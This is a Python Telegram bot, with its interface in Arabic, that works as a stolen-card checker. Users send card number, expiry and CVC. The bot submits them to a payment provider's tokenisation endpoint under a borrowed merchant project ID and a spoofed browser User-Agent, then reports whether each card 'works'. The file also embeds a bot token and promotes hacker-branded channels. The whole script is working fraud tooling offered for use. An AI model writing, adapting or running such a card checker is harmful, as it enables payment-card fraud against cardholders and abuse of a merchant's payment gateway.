# bot-telegram
import requests
import telebot
from telebot import types
from user_agent import generate_user_agent

call = types.InlineKeyboardButton(text="- فحص بطاقة الفيزا 💳", callback_data='s1')
call2 = types.InlineKeyboardButton(text="- قناة المطور 👨‍💼", url='t.me/Dz_hacker')

TOKEN = "6505436932:AAGxgEVa4_necGc2xzCQ7MtdTDZk4MhFQy8"
# استخدم الرمز المميز للبوت من أجل التوكن
bot = telebot.TeleBot(token=TOKEN)

@bot.message_handler(commands=["start"])
def start(message):
    name = message.from_user.first_name
    Keyy = types.InlineKeyboardMarkup()
    Keyy.row_width = 1
    Keyy.add(call, call2)
    bot.reply_to(message, text=f'''
- مرحبًا {name} 👨‍💼
- اسمي: you_off01 🙆‍♂️
- بوت فحص البطاقات 🤖
- اختر أي زر

CH: @Digital_killer1
''', reply_markup=Keyy)

@bot.callback_query_handler(func=lambda m: True)
def aws(call):
    if call.data == 's1':
        txt = bot.send_message(call.message.chat.id, f"- أرسل البطاقة")
        bot.register_next_step_handler(txt, check_cards)

def check_cards(message):
    card = message.text
    bot.reply_to(message, text=f'''
- تم حفظ البطاقة
- البطاقة: {card}
- يرجى الانتظار ...
''')
    num = card.split('|')[0]
    mo = card.split('|')[1]
    ye = card.split('|')[2]
    cvc = card.split('|')[3]
    headers = {
        "Host": "sipg.micropayment.de",
        "Connection": "keep-alive",
        "Content-Length": "303",
        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": generate_user_agent(),
        "sec-ch-ua-platform": "\"Android\"",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://sipg.micropayment.de",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://sipg.micropayment.de/public/bridge/v1/iframe.php?w\u003dpan",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7"
    }
    data = {"project": "awsking", "testmode": "0",
            "fields": {"holder": "Mr Aws", "month": f"{mo}", "year": f"{ye}", "pan": f"{num}", "cvc": f"{cvc}"},
            "secure": {"ct": "3hH/PhgUcCKbgVlOSJYaOw9iJFGJtYIxap5uQoz0qbUzUf+BSqsqwrPAFHp5TKsalRBOT1yyjek=",
                       "iv": "6e325bfe8c76f6e0", "s": "075dfcb99861e7b0", "kh": "qx6+9DS+keV0GUNMc23eQg=="}}
    check = requests.post('https://sipg.micropayment.de/public/panstore/?function=init', json=data,
                          headers=headers).json()
    token = check["token"]
    code = check["code"]
    if token is not None and code == 'ok':
        print(check)
        bot.reply_to(message, text=f'''
- البطاقة: {card}
- حالة البطاقة: تعمل
- المبرمج: @you_off01
''')
    else:
        print(check)
        bot.reply_to(message, text=f'''
- البطاقة: {card}
- حالة البطاقة: لا تعمل
- المبرمج: @you_off01
''')

# استمرار تشغيل البوت
bot.infinity_polling()
